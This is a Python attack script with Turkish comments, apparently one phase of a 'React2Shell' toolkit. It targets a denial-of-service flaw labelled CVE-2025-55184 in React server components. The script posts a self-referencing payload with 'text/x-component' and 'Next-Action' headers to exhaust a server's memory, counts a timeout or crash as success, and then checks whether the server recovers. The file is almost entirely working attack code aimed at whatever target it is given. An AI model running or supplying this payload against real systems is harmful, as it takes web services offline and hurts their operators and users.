#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
React2Shell — Faz 4: Hizmet Reddi (DoS - CVE-2025-55184)
Memory ve CPU exhaustion vektörlerini test eder.
"""

import sys
import time
import requests
from utils import (
    print_phase_banner, check_target, info, success, warning, error,
    parse_target_arg, timed_request, DEFAULT_HEADERS, Colors
)

def measure_baseline(target_url):
    """Normal durumdaki yanıt süresini ölçer"""
    info("Baseline (Normal Yanıt Süresi) ölçülüyor...")
    times = []
    
    for i in range(3):
        _, elapsed = timed_request("GET", target_url)
        times.append(elapsed)
        time.sleep(0.5)
        
    avg_time = sum(times) / len(times)
    success(f"Ortalama baseline yanıt süresi: {avg_time:.2f}ms")
    return avg_time

def test_memory_exhaustion(target_url, baseline_ms):
    """Memory exhaustion (Bellek Tükenmesi) saldırısı yapar"""
    info("Memory Exhaustion Payload'ı gönderiliyor...")
    
    # Self-referencing loop simülasyonu payload'ı
    payload = "0:[\"$\",\"@1\",null,{\"ref\":\"$self\",\"nested\":{\"ref\":\"$self\",\"depth\":\"infinite\",\"children\":[\"$self\",\"$self\",\"$self\"]}}]"
    
    headers = DEFAULT_HEADERS.copy()
    headers["Content-Type"] = "text/x-component"
    headers["Next-Action"] = "1"
    
    info("Bu işlem hedef sunucuyu dondurabilir, yanıt bekleniyor (timeout: 15s)...")
    
    try:
        start_time = time.time()
        resp = requests.post(target_url, headers=headers, data=payload, timeout=15)
        elapsed = (time.time() - start_time) * 1000
        
        warning(f"Sunucu {elapsed:.2f}ms sonra yanıt verdi (Durum: {resp.status_code}).")
        
        # Eğer gecikme baseline'dan çok yüksekse (örn: 10 kat), DoS başarılı sayılır
        if elapsed > (baseline_ms * 10):
            success(f"DoS Etkisi Gözlemlendi: Yanıt süresi {elapsed/baseline_ms:.1f}x arttı!")
            return True
        else:
            info("Belirgin bir gecikme gözlemlenmedi.")
            return False
            
    except requests.Timeout:
        success(f"DoS BAŞARILI! Sunucu yanıt veremiyor (Timeout).")
        return True
    except requests.ConnectionError:
        success("DoS BAŞARILI! Sunucu çöktü (Bağlantı koptu).")
        return True
    except Exception as e:
        error(f"Beklenmeyen hata: {e}")
        return False

def check_recovery(target_url):
    """Sunucunun toparlanıp toparlanmadığını kontrol eder"""
    info("Sunucu kurtarma durumu kontrol ediliyor...")
    max_retries = 10
    
    for i in range(max_retries):
        try:
            resp, elapsed = timed_request("GET", target_url, timeout=3)
            if resp and resp.status_code == 200:
                success(f"Sunucu toparlandı! (Deneme: {i+1}, Yanıt: {elapsed:.2f}ms)")
                return True
        except:
            pass
            
        print(f"  {Colors.DIM}Bekleniyor... ({i+1}/{max_retries}){Colors.RESET}", end="\r")
        time.sleep(2)
        
    error("Sunucu toparlanamadı! Manuel müdahale gerekebilir.")
    return False

def execute_dos(target_url):
    """Hizmet Reddi (DoS) testini yürütür"""
    print_phase_banner(3, "Hizmet Reddi (DoS) Testi", "CVE-2025-55184")
    
    baseline_ms = measure_baseline(target_url)
    if not baseline_ms:
        error("Baseline ölçülemedi.")
        sys.exit(1)
        
    print()
    dos_success = test_memory_exhaustion(target_url, baseline_ms)
    
    print()
    if dos_success:
        check_recovery(target_url)

if __name__ == "__main__":
    args = parse_target_arg()
    if not check_target(args.target):
        sys.exit(1)
    execute_dos(args.target)
